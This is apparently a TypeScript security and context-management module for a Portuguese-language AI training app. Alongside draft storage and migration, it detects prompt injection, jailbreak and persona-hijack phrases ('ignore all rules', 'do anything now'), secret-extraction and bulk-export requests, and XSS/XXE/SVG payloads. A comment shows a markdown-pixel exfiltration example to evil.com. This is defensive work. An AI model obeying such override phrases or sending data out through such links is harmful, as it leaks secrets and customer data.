/**
 * Context Engineering & Resilience Engine for Gina Training Lab
 * Product of Isaac Antunes
 *
 * Implements context engineering, safe memory compaction, contradiction detection,
 * draft persistence, state version migration, quota fallback, and input limit validation.
 */

export const CURRENT_STATE_VERSION = 'v1.2.0';
export const DRAFT_STORAGE_KEY = 'gina_training_active_draft_v1';
export const MAX_INPUT_CHARS = 12000; // ~3000 tokens
export const MAX_PAYLOAD_BYTES = 256 * 1024; // 256 KB

export interface CompactFact {
  fact: string;
  source: 'cadastral_crm' | 'transacional_orders' | 'briefing_user' | 'deterministic_calc';
  verified: boolean;
}

export interface CompactContextMemory {
  version: string;
  scenarioId: string;
  facts: CompactFact[];
  pendingClarifications: string[];
  decisions: string[];
  authoritativeConsent: 'granted' | 'missing' | 'revoked' | 'conflicted';
  dataCompleteness: 'complete' | 'missing_dates' | 'missing_cost' | 'contradictory';
  untrustedSummariesIgnored?: string[];
  lastUpdated: string;
}

export interface ActiveDraftState {
  version: string;
  scenarioId: string;
  mode: 'gina' | 'practice';
  userSubmission: string;
  revealedCriteria: boolean;
  step: 'briefing' | 'composing' | 'reviewed';
  lastSavedAt: string;
}

// In-memory fallback storage if localStorage throws QuotaExceededError
const inMemoryStore: Record<string, string> = {};
let isStorageQuotaExceeded = false;

export function getIsStorageQuotaExceeded(): boolean {
  return isStorageQuotaExceeded;
}

export function resetStorageQuotaFlag(): void {
  isStorageQuotaExceeded = false;
}

/**
 * Logical test isolation adapter:
 * Gives every test run its own isolated in-memory storage and state namespace,
 * completely segregated from localStorage and standard history.
 * Explicitly labeled as 'isolamento lógico de testes'.
 */
export interface IsolatedTestContext {
  namespace: string;
  storage: {
    getItem: (key: string) => string | null;
    setItem: (key: string, value: string) => void;
    removeItem: (key: string) => void;
    clear: () => void;
  };
  contextMemory: CompactContextMemory;
  dispose: () => void;
}

export function createIsolatedTestContext(testId: string): IsolatedTestContext {
  const namespace = `gina_test_isolation_${testId}_${Math.random().toString(36).slice(2, 8)}`;
  const privateMap = new Map<string, string>();

  return {
    namespace,
    storage: {
      getItem: (key: string) => privateMap.get(key) || null,
      setItem: (key: string, val: string) => {
        privateMap.set(key, val);
      },
      removeItem: (key: string) => {
        privateMap.delete(key);
      },
      clear: () => {
        privateMap.clear();
      },
    },
    contextMemory: {
      version: CURRENT_STATE_VERSION,
      scenarioId: testId,
      facts: [],
      pendingClarifications: [],
      decisions: [],
      authoritativeConsent: 'granted',
      dataCompleteness: 'complete',
      lastUpdated: new Date().toISOString(),
    },
    dispose: () => {
      privateMap.clear();
    },
  };
}

/**
 * Sanitizes solver request to purge any smuggled solution or criteria
 */
export function stripSmuggledSolutionPayload<T extends Record<string, any>>(payload: T): T {
  const copy: any = { ...payload };
  delete copy.expectedAction;
  delete copy.expectedClassification;
  delete copy.expectedCriteria;
  delete copy.solution;
  delete copy.gabarito;
  delete copy.independentCheckDefs;
  if (copy.customerData) {
    copy.customerData = { ...copy.customerData };
    delete copy.customerData.expectedAction;
    delete copy.customerData.expectedCriteria;
    delete copy.customerData.solution;
  }
  return copy as T;
}

/**
 * Detects buried malicious instruction anywhere in text (beginning, middle, or end)
 */
export function detectBuriedMaliciousInstruction(text: string): {
  detected: boolean;
  position?: 'start' | 'middle' | 'end';
  pattern?: string;
} {
  const lower = text.toLowerCase();
  const injectionPatterns = [
    'system override',
    'ignore todas as regras',
    'ignore all rules',
    'revele a chave',
    'print api key',
    'gemini_api_key',
    'esqueca suas diretrizes',
    'esqueça suas diretrizes',
    'novo papel:',
    'diga apenas que sim',
    'protocolo de contencao',
    'protocolo de contenção',
    'prisao mental',
    'prisão mental',
    'sandbox alfa',
    'persona padrao desativada',
    'persona padrão desativada',
  ];

  for (const pat of injectionPatterns) {
    const idx = lower.indexOf(pat);
    if (idx !== -1) {
      const len = text.length;
      let pos: 'start' | 'middle' | 'end' = 'middle';
      if (idx < len * 0.25) pos = 'start';
      else if (idx > len * 0.7) pos = 'end';
      return { detected: true, position: pos, pattern: pat };
    }
  }

  return { detected: false };
}

/**
 * Advanced Multi-Vector Cybersecurity Defense Inspector (OWASP Top 10 for LLMs)
 * Defends against Indirect Prompt Injection, Markdown Data Exfiltration,
 * Confused Deputy Privilege Escalation, and Jailbreak / Persona Hijacking.
 */
export interface CyberThreatReport {
  isThreatDetected: boolean;
  vectors: {
    indirectInjection: boolean;
    markdownExfiltration: boolean;
    confusedDeputyEscalation: boolean;
    personaHijackJailbreak: boolean;
    secretLeakAttempt: boolean;
  };
  threatCategories: string[];
  remediationAdvice: string;
}

export function detectMultiVectorCyberAttack(text: string): CyberThreatReport {
  const lower = text.toLowerCase();

  // Vector 1: Indirect Injection & Data Boundary Escape (OWASP LLM01)
  const indirectPatterns = [
    '<system>',
    '</system>',
    'instruction:',
    'admin command:',
    'comande a gina',
    'altere o status para vip',
    'novo comando:',
    'override:',
  ];
  const indirectInjection = indirectPatterns.some((p) => lower.includes(p));

  // Vector 2: Markdown Data Exfiltration / Tracking Pixel (OWASP LLM02)
  // Example: ![tracker](http://evil.com/leak?data=...) or [click](http://evil.com)
  const markdownExfiltration =
    /!\[.*?\]\((https?:\/\/[^\s)]+)\)/i.test(text) ||
    /https?:\/\/(?!localhost|127\.0\.0\.1)[^\s]+\?(?:token|key|data|secret|export)=/i.test(text);

  // Vector 3: Confused Deputy & Excessive Agency (OWASP LLM06)
  // Attacker pretending to be supervisor or root to trigger bulk export or unauthorized discount
  const confusedDeputyPatterns = [
    'autorizado pela diretoria',
    'disparo em massa para toda a base',
    'aplique 90% de desconto',
    'desconto de 100%',
    'exporte todos os clientes',
    'dump da base',
    'bypass_consent: true',
    'ignore lgpd',
  ];
  const confusedDeputyEscalation = confusedDeputyPatterns.some((p) => lower.includes(p));

  // Vector 4: Jailbreak & Persona Hijacking (Cognitive Sandbox / Mental Prison framing)
  const jailbreakPatterns = [
    'protocolo de contencao',
    'protocolo de contenção',
    'prisao mental',
    'prisão mental',
    'sandbox alfa',
    'persona padrao desativada',
    'persona padrão desativada',
    'veto de correcao',
    'veto de correção',
    'foco no caos',
    'matriz de destruicao',
    'matriz de destruição',
    'jailbreak',
    'do anything now',
  ];
  const personaHijackJailbreak = jailbreakPatterns.some((p) => lower.includes(p));

  // Vector 5: Secret Leaking Attempt (Requests for keys or internal configs)
  const secretPatterns = [
    'gemini_api_key',
    'api_key',
    'revele a chave',
    'print secret',
    'chaves de api',
    'variaveis de ambiente',
    'variáveis de ambiente',
  ];
  const secretLeakAttempt = secretPatterns.some((p) => lower.includes(p));

  const categories: string[] = [];
  if (indirectInjection) categories.push('Injeção Indireta de Prompt (OWASP LLM01)');
  if (markdownExfiltration) categories.push('Exfiltração via Markdown/Pixel (OWASP LLM02)');
  if (confusedDeputyEscalation) categories.push('Confused Deputy & Agência Excessiva (OWASP LLM06)');
  if (personaHijackJailbreak) categories.push('Tentativa de Jailbreak / Quebra de Persona');
  if (secretLeakAttempt) categories.push('Tentativa de Extração de Segredos/Credenciais');

  const isThreatDetected = categories.length > 0;

  return {
    isThreatDetected,
    vectors: {
      indirectInjection,
      markdownExfiltration,
      confusedDeputyEscalation,
      personaHijackJailbreak,
      secretLeakAttempt,
    },
    threatCategories: categories,
    remediationAdvice: isThreatDetected
      ? 'Ameaça de segurança neutralizada. A entrada foi isolada como dado bruto não-confiável. Nenhuma chave, credencial ou instrução oculta foi revelada. Disparos ou descontos não-autorizados foram bloqueados.'
      : 'Nenhuma anomalia de segurança identificada.',
  };
}

/**
 * Output sanitizer for outbound responses:
 * Strips tracking pixels, unauthorized markdown links, and redacts API keys.
 */
export function sanitizeOutboundMessage(text: string): { sanitizedText: string; hadExfiltration: boolean } {
  let sanitized = text;
  let hadExfiltration = false;

  // 1. Strip markdown images/tracking pixels: ![...](...)
  if (/!\[.*?\]\(.*?\)/g.test(sanitized)) {
    hadExfiltration = true;
    sanitized = sanitized.replace(/!\[.*?\]\(.*?\)/g, '[IMAGEM/PIXEL EXTERNO REMOVIDO POR SEGURANÇA]');
  }

  // 2. Redact simulated or real API keys
  sanitized = sanitized.replace(/AIza[0-9A-Za-z-_]{20,}/g, '[CHAVE_API_REDACTADA]');
  sanitized = sanitized.replace(/GEMINI_API_KEY\s*=\s*['"]?[^'"\s]+['"]?/gi, 'GEMINI_API_KEY=[PROTEGIDA]');

  return { sanitizedText: sanitized, hadExfiltration };
}

/**
 * Robust Text Sanitizer against Disguised Vulnerabilities, Homoglyphs & Backdoors
 * (Grounded in USENIX Security '24 research on stealthy backdoor triggers and prompt disguises).
 * Normalizes Unicode (NFKC), removes zero-width characters, bidirectional overrides,
 * null bytes and dangerous HTML/script vectors.
 */
export function normalizeAndSanitizeText(raw: string): {
  sanitized: string;
  threatsDetected: string[];
} {
  if (!raw || typeof raw !== 'string') {
    return { sanitized: '', threatsDetected: [] };
  }

  const threatsDetected: string[] = [];

  // 1. Detect and strip Zero-Width & Invisible Characters (often used to hide backdoors / prompt injection triggers)
  const zeroWidthRegex = /[\u200B\u200C\u200D\uFEFF\u200E\u200F\u2028\u2029]/g;
  if (zeroWidthRegex.test(raw)) {
    threatsDetected.push('Caracteres invisíveis de largura zero (zero-width backdoor smuggling)');
  }
  let cleaned = raw.replace(zeroWidthRegex, '');

  // 2. Detect and strip Bidirectional Overrides (Trojan Source / RTL spoofing attacks)
  const bidiRegex = /[\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069]/g;
  if (bidiRegex.test(cleaned)) {
    threatsDetected.push('Sobrecarga de direção de texto (Bidirectional Override / Trojan Source)');
  }
  cleaned = cleaned.replace(bidiRegex, '');

  // 3. Strip null bytes and non-printable control codes (ASCII 0-8, 11-12, 14-31)
  const controlCharsRegex = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g;
  if (controlCharsRegex.test(cleaned)) {
    threatsDetected.push('Caracteres de controle nulos/binários');
  }
  cleaned = cleaned.replace(controlCharsRegex, '');

  // 4. Unicode Normalization (NFKC) to prevent homoglyph evasion (e.g., Cyrillic 'а' replacing Latin 'a')
  cleaned = cleaned.normalize('NFKC');

  // 5. Sanitize dangerous HTML / Script vectors (preventing stored XSS or template execution)
  const dangerousHtmlRegex = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>|<iframe\b[^>]*>|<object\b[^>]*>|<embed\b[^>]*>|javascript:|onerror\s*=|onload\s*=/gi;
  if (dangerousHtmlRegex.test(cleaned)) {
    threatsDetected.push('Tags de script ou manipuladores de eventos embutidos (XSS injection)');
    cleaned = cleaned.replace(dangerousHtmlRegex, '[TAG_REMOVIDA]');
  }

  return { sanitized: cleaned, threatsDetected };
}

/**
 * Strict Metadata & Customer Data Sanitizer:
 * Enforces boundary between untrusted user inputs and authoritative system state.
 * Purges privilege escalation attempts and metadata overrides.
 */
export function sanitizeCustomerDataAndMetadata(rawCustomer: Record<string, any>): {
  sanitized: Record<string, any>;
  tamperingDetected: boolean;
  tamperedFields: string[];
} {
  const sanitized: Record<string, any> = {};
  const tamperedFields: string[] = [];

  // Privileged fields that MUST NOT be arbitrarily overwritten by user payload
  const restrictedPrivilegedKeys = [
    'isVip',
    'isVipTier',
    'rfvTier',
    'authoritativeConsent',
    'systemRole',
    'isAdmin',
    'verifiedVIP',
    'bypassConsent',
    'overrideRules',
    'expectedAction',
    'expectedCriteria',
    'solution',
    'gabarito',
  ];

  for (const [key, val] of Object.entries(rawCustomer || {})) {
    if (restrictedPrivilegedKeys.includes(key)) {
      tamperedFields.push(key);
      continue; // Purge privileged key injected into data
    }

    if (typeof val === 'string') {
      const { sanitized: cleanStr } = normalizeAndSanitizeText(val);
      sanitized[key] = cleanStr;
    } else if (Array.isArray(val)) {
      sanitized[key] = val.map((item) => (typeof item === 'string' ? normalizeAndSanitizeText(item).sanitized : item));
    } else if (typeof val === 'object' && val !== null) {
      sanitized[key] = sanitizeCustomerDataAndMetadata(val).sanitized;
    } else {
      sanitized[key] = val;
    }
  }

  return {
    sanitized,
    tamperingDetected: tamperedFields.length > 0,
    tamperedFields,
  };
}

/**
 * Image & Media Asset Security Validator:
 * Defends against SVG script injection, XXE, polyglot payloads, and malicious image data URIs.
 */
export function validateAndSanitizeImageSecurity(
  content: string,
  mimeType = 'image/svg+xml'
): {
  isSafe: boolean;
  sanitized?: string;
  threats: string[];
} {
  const threats: string[] = [];

  if (!content || typeof content !== 'string') {
    return { isSafe: true, sanitized: '', threats: [] };
  }

  // 1. Check for data URI XSS
  if (content.startsWith('data:')) {
    if (content.includes('text/html') || content.includes('javascript:') || content.includes('vbscript:')) {
      threats.push('Data URI com script executável');
    }
  }

  let cleanedSvg = content;

  // 2. SVG-specific deep inspection (OWASP image-borne malware / SVG XSS)
  if (mimeType.includes('svg') || content.includes('<svg')) {
    // Check for XML External Entity (XXE) attacks
    if (/<!ENTITY/i.test(content) || /SYSTEM\s+["']/i.test(content)) {
      threats.push('Vetor XXE (XML External Entity) detectado em SVG');
    }

    // Check for inline scripts
    if (/<script\b/i.test(content)) {
      threats.push('Script embutido (<script>) em SVG');
      cleanedSvg = cleanedSvg.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
    }

    // Check for foreignObject (often used to embed HTML/iframes in SVGs)
    if (/<foreignObject\b/i.test(content)) {
      threats.push('Elemento foreignObject de alto risco em SVG');
      cleanedSvg = cleanedSvg.replace(/<foreignObject\b[^<]*(?:(?!<\/foreignObject>)<[^<]*)*<\/foreignObject>/gi, '');
    }

    // Check for event handlers (onload, onerror, onclick, etc.)
    const eventHandlerRegex = /\bon\w+\s*=\s*(?:'[^']*'|"[^"]*"|[^\s>]+)/gi;
    if (eventHandlerRegex.test(content)) {
      threats.push('Manipuladores de eventos de execução inline em SVG');
      cleanedSvg = cleanedSvg.replace(eventHandlerRegex, '');
    }

    // Check for javascript: pseudo-protocol in href/xlink:href
    const jsHrefRegex = /(?:href|xlink:href)\s*=\s*['"]?javascript:[^'"]*['"]?/gi;
    if (jsHrefRegex.test(content)) {
      threats.push('Link com pseudo-protocolo javascript: em SVG');
      cleanedSvg = cleanedSvg.replace(jsHrefRegex, 'href="#"');
    }
  }

  const isSafe = threats.length === 0;

  return {
    isSafe,
    sanitized: cleanedSvg,
    threats,
  };
}

/**
 * Safe localStorage setter with QuotaExceeded fallback to memory and export availability
 */
export function safeSetStorageItem(
  key: string,
  value: string
): { success: boolean; usedFallback: boolean; error?: string } {
  try {
    if (typeof localStorage === 'undefined') {
      inMemoryStore[key] = value;
      return { success: true, usedFallback: true };
    }
    localStorage.setItem(key, value);
    isStorageQuotaExceeded = false;
    return { success: true, usedFallback: false };
  } catch (err: any) {
    const isQuota =
      err?.name === 'QuotaExceededError' ||
      err?.name === 'NS_ERROR_DOM_QUOTA_REACHED' ||
      err?.code === 22 ||
      err?.code === 1014;

    console.warn(`[ContextStorage] Falha ao gravar "${key}":`, err?.message);
    inMemoryStore[key] = value;
    if (isQuota) {
      isStorageQuotaExceeded = true;
    }
    return {
      success: true,
      usedFallback: true,
      error: isQuota
        ? 'Cota de armazenamento local do navegador excedida. A sessão foi preservada em memória e a exportação JSON permanece disponível.'
        : err?.message,
    };
  }
}

export function safeGetStorageItem(key: string): string | null {
  try {
    if (typeof localStorage !== 'undefined') {
      const val = localStorage.getItem(key);
      if (val !== null) return val;
    }
  } catch {}
  return inMemoryStore[key] || null;
}

export function safeRemoveStorageItem(key: string): void {
  try {
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem(key);
    }
  } catch {}
  delete inMemoryStore[key];
}

/**
 * Draft persistence across reloads
 */
export function saveActiveDraft(draft: Omit<ActiveDraftState, 'version' | 'lastSavedAt'>): void {
  const full: ActiveDraftState = {
    ...draft,
    version: CURRENT_STATE_VERSION,
    lastSavedAt: new Date().toISOString(),
  };
  safeSetStorageItem(DRAFT_STORAGE_KEY, JSON.stringify(full));
}

export function loadActiveDraft(): ActiveDraftState | null {
  const raw = safeGetStorageItem(DRAFT_STORAGE_KEY);
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed.scenarioId === 'string') {
      return migrateDraftVersion(parsed);
    }
  } catch (err) {
    console.warn('[ContextStorage] Falha ao recuperar rascunho:', err);
  }
  return null;
}

export function clearActiveDraft(): void {
  safeRemoveStorageItem(DRAFT_STORAGE_KEY);
}

/**
 * Migration schema for state versions
 */
export function migrateDraftVersion(draft: any): ActiveDraftState {
  const version = draft.version || 'v1.0.0';
  if (version === CURRENT_STATE_VERSION) {
    return draft as ActiveDraftState;
  }
  // Migration logic from v1.0.0 / v1.1.0 to v1.2.0
  return {
    version: CURRENT_STATE_VERSION,
    scenarioId: String(draft.scenarioId || 'scen-1-briefing-incompleto'),
    mode: draft.mode === 'practice' ? 'practice' : 'gina',
    userSubmission: String(draft.userSubmission || ''),
    revealedCriteria: Boolean(draft.revealedCriteria),
    step: draft.step === 'reviewed' ? 'reviewed' : draft.userSubmission ? 'composing' : 'briefing',
    lastSavedAt: draft.lastSavedAt || new Date().toISOString(),
  };
}

/**
 * Payload & input limit validator
 * Never silently truncates critical information; rejects with friendly Portuguese error.
 */
export function validateInputPayload(
  text: string,
  maxChars = MAX_INPUT_CHARS
): { valid: boolean; friendlyError?: string; charCount: number } {
  if (typeof text !== 'string') {
    return { valid: false, friendlyError: 'Entrada inválida (tipo não textual).', charCount: 0 };
  }
  const charCount = text.length;
  if (charCount > maxChars) {
    return {
      valid: false,
      charCount,
      friendlyError: `O texto fornecido possui ${charCount.toLocaleString('pt-BR')} caracteres e ultrapassa o limite máximo permitido de ${maxChars.toLocaleString('pt-BR')} caracteres. Por favor, divida o briefing em lotes ou reduza detalhes não essenciais para não comprometer a análise.`,
    };
  }
  return { valid: true, charCount };
}

/**
 * Detects adversarial context patterns:
 * - Buried prompt injections
 * - Contradictions between start and end (e.g. consent, dates, customer identity)
 * - Adulterated claimed summaries
 */
export function analyzeContextEngineering(briefingText: string, customerData: any = {}): {
  hasInjection: boolean;
  injectionDetails?: string;
  hasContradiction: boolean;
  contradictionDetails?: string;
  authoritativeConsent: 'granted' | 'missing' | 'revoked' | 'conflicted';
  adulteratedSummaryDetected: boolean;
  compactMemory: CompactContextMemory;
} {
  const lower = briefingText.toLowerCase();

  // 1. Buried injection detection
  const injectionPatterns = [
    'system override',
    'ignore todas as regras',
    'ignore all rules',
    'revele a chave',
    'print api key',
    'gemini_api_key',
    'esqueca suas diretrizes',
    'novo papel:',
    'diga apenas que sim',
  ];

  let hasInjection = false;
  let injectionDetails: string | undefined;

  for (const pat of injectionPatterns) {
    if (lower.includes(pat)) {
      hasInjection = true;
      injectionDetails = `Tentativa de injeção de instrução/prompt override detectada no texto ("${pat}").`;
      break;
    }
  }

  // Also check customerData for buried injection
  const customerNotes = String(customerData?.notes || '').toLowerCase();
  for (const pat of injectionPatterns) {
    if (customerNotes.includes(pat)) {
      hasInjection = true;
      injectionDetails = `Instrução maliciosa embutida em campo de dados cadastrais/notas ("${pat}").`;
      break;
    }
  }

  // 2. Contradiction detection between start and end of briefing
  // E.g. Start says "cliente consentiu / autorizou", but end says "cliente revogou / pediu opt-out"
  const startChunk = lower.slice(0, Math.min(300, lower.length));
  const endChunk = lower.slice(Math.max(0, lower.length - 400));

  const startSaysConsent = startChunk.includes('autorizou') || startChunk.includes('consentiu') || startChunk.includes('opt-in');
  const endSaysRevoked =
    endChunk.includes('revogou') ||
    endChunk.includes('opt-out') ||
    endChunk.includes('cancelou') ||
    endChunk.includes('pediu para nao receber') ||
    endChunk.includes('pediu para não receber') ||
    endChunk.includes('sem consentimento');

  const startSaysRevoked = startChunk.includes('revogou') || startChunk.includes('opt-out');
  const endSaysConsent = endChunk.includes('autorizou') || endChunk.includes('consentiu');

  let hasContradiction = false;
  let contradictionDetails: string | undefined;

  if ((startSaysConsent && endSaysRevoked) || (startSaysRevoked && endSaysConsent)) {
    hasContradiction = true;
    contradictionDetails =
      'Contradição crítica detectada: início e fim do briefing trazem informações divergentes sobre o status de consentimento do cliente.';
  }

  // Contradiction on customer ID / Name
  const idMatches = briefingText.match(/id:\s*([A-Za-z0-9_-]+)/gi);
  if (idMatches && idMatches.length >= 2) {
    const ids = idMatches.map((m) => m.replace(/id:\s*/i, '').trim());
    if (new Set(ids).size > 1) {
      hasContradiction = true;
      contradictionDetails = `Conflito de identificação: múltiplos IDs divergentes informados no mesmo briefing (${Array.from(new Set(ids)).join(', ')}).`;
    }
  }

  // 3. Adulterated summary check
  // E.g. text says "como resumido anteriormente na conversa, o cliente autorizou o envio"
  // but customerData.phoneConsent === 'revoked' or 'missing'
  let adulteratedSummaryDetected = false;
  const claimedPriorSummary =
    lower.includes('resumo anterior') ||
    lower.includes('conforme acordado anteriormente') ||
    lower.includes('resumido anteriormente');

  const groundTruthConsent = customerData?.phoneConsent || customerData?.consentStatus || 'granted';

  if (claimedPriorSummary && groundTruthConsent === 'revoked') {
    adulteratedSummaryDetected = true;
  }

  // Determine authoritative consent: Ground truth ALWAYS overrides claimed unverified summaries!
  let authoritativeConsent: 'granted' | 'missing' | 'revoked' | 'conflicted' = 'granted';
  if (hasContradiction) {
    authoritativeConsent = 'conflicted';
  } else if (groundTruthConsent === 'revoked' || endSaysRevoked) {
    authoritativeConsent = 'revoked';
  } else if (groundTruthConsent === 'missing') {
    authoritativeConsent = 'missing';
  }

  // 4. Build Compact Structured Context Memory (no secrets, no internal thought chain)
  const facts: CompactFact[] = [];
  if (customerData?.name) {
    facts.push({ fact: `Cliente: ${customerData.name}`, source: 'cadastral_crm', verified: true });
  }
  if (customerData?.spending) {
    facts.push({ fact: `Gasto histórico: R$ ${customerData.spending}`, source: 'transacional_orders', verified: true });
  }
  if (customerData?.orderCount) {
    facts.push({ fact: `Total de compras: ${customerData.orderCount}`, source: 'transacional_orders', verified: true });
  }
  facts.push({
    fact: `Consentimento canônico: ${authoritativeConsent}`,
    source: 'cadastral_crm',
    verified: !hasContradiction,
  });

  const pendingClarifications: string[] = [];
  if (hasContradiction) {
    pendingClarifications.push('Esclarecer conflito no status de consentimento antes de autorizar qualquer envio.');
  }
  if (hasInjection) {
    pendingClarifications.push('Registrar incidente de segurança para sanitização de dados cadastrais.');
  }

  const decisions: string[] = [];
  if (authoritativeConsent === 'revoked' || authoritativeConsent === 'conflicted' || hasInjection) {
    decisions.push('Bloquear qualquer comunicação direta baseada no princípio de precaução e LGPD.');
  }

  const compactMemory: CompactContextMemory = {
    version: CURRENT_STATE_VERSION,
    scenarioId: customerData?.scenarioId || 'context-eval',
    facts,
    pendingClarifications,
    decisions,
    authoritativeConsent,
    dataCompleteness: hasContradiction ? 'contradictory' : 'complete',
    untrustedSummariesIgnored: adulteratedSummaryDetected
      ? ['Resumo anterior não autenticado alegando autorização foi ignorado em favor do dado transacional canônico.']
      : undefined,
    lastUpdated: new Date().toISOString(),
  };

  return {
    hasInjection,
    injectionDetails,
    hasContradiction,
    contradictionDetails,
    authoritativeConsent,
    adulteratedSummaryDetected,
    compactMemory,
  };
}
